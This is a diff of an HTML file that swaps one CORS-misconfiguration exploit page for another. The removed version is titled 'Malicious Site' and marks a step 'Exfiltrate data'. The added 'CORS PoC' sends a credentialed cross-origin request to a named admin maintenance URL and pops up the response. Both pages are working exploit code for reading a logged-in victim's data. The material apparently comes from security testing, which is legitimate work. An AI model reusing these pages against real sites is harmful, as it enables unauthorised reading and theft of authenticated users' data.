@@ -1,24 +1,23 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Malicious Site</title>
-</head>
-<body>
-    <h1>Malicious Site</h1>
-    <button id="exploitButton">Exploit CORS</button>
-    <script>
-        document.getElementById('exploitButton').onclick = function() {
-            var xhr = new XMLHttpRequest();
-            xhr.open('GET', 'https://target.com/sensitive-data', true);
-            xhr.withCredentials = true;
-            xhr.onload = function () {
-                if (xhr.status === 200) {
-                    console.log(xhr.responseText); // Exfiltrate data
-                }
-            };
-            xhr.send();
-        };
-    </script>
-</body>
-</html>
+<html>
+     <body>
+         <h2>CORS PoC</h2>
+         <div id="demo">
+             <button type="button" onclick="cors()">Exploit</button>
+         </div>
+         <script>
+             function cors() {
+             var xhr = new XMLHttpRequest();
+             xhr.onreadystatechange = function() {
+                 if (this.readyState == 4 && this.status == 200) {
+                 document.getElementById("demo").innerHTML = alert(this.responseText);
+                 }
+             };
+              xhr.open("GET",
+                       "https://customeradmin.sodic.com/Maintenance", true);
+             xhr.withCredentials = true;
+             xhr.send();
+             }
+         </script>
+     </body>
+ </html>
